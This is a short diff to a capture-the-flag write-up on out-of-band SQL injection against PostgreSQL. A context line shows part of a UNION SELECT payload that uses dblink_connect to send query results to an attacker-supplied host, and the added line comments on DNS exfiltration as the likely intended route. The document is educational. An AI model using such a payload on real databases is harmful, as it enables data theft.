@@ -221,6 +221,7 @@ asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_fr
 
 Flag: **fb{@@dns_3xfil_f0r_the_w1n!!@@}**
 
+A nice challenge to learn Out-of-Band SQL Injection and PostgreSQL! Because the flag mentions `dns`, maybe the way to exfiltrate data through PostgreSQL network communication is not the intended solution.
 
 ## Bahasa Indonesia
 TODO
